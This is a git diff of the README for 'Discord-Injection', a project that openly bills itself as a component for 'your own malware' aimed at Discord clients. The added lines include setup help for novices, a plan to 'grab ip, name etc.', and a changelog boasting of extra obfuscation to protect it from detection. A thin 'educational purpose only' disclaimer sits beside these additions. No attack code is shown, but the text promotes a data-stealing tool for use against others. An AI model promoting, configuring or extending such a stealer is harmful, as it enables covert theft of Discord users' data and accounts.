@@ -23,6 +23,9 @@
   <img src="https://img.shields.io/github/stars/Rdimo/Discord-Injection?color=7F9DE0&label=Stars&style=flat-square" </a>
   <img src="https://img.shields.io/github/forks/Rdimo/Discord-Injection?color=7F9DE0&label=Forks&style=flat-square" </a>
 </p>
+
+##### ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ [🌌・Discord](https://cheataway.com) ⋮  [💉・Setting up the injection](https://github.com/Rdimo/Discord-Injection#configure-discord-injection) ⋮ [💻・License](https://github.com/Rdimo/Discord-Injection#license) ⋮ [📜・ChangeLog](https://github.com/Rdimo/Discord-Injection#changelog)
+
 <h2 align="center">
   Discord-Injection was made by
 
@@ -79,6 +82,7 @@ const config = {
     ... //rest of the config you should NOT touch
 };
 ```
+> Don't quite understand how to set it up? [Click me!](https://github.com/Rdimo/Discord-Injection#want-to-use-it-but-dont-know-shit-about-coding)
 
 ## 🎈・Code example
 Example of how you can implement this injection into your own malware
@@ -121,6 +125,7 @@ Any ideas on how to improve the injection? Or just think you got something you w
 Found a bug? please please please [Open a new issue](https://github.com/rdimo/Discord-injection/issues) and tell me about it so I can fix it asap
 
 ## 🎉・Upcoming/Todo
+- Grab ip, name etc...
 - fix bugs
 - more settings
 
@@ -135,6 +140,13 @@ This project is licensed under the GNU General Public License v3.0 License - see
 
 ・Educational purpose only and all your consequences caused by you actions is your responsibility 
 
-・Selling this **Free** injection is forbidden
+・Selling this ==**Free**== injection is forbidden
 
-・If you make a copy of this/or fork it, it **must** be open-source and have credits to this repo
+・If you make a copy of this/or fork it, it ==**must**== be open-source and have credits linking to this repo
+
+## 💭・ChangeLog
+```diff
++ Added BetterDiscord support
++ Added dead code into obfuscation to protect even more
+- Accidently removed status code checker
+```
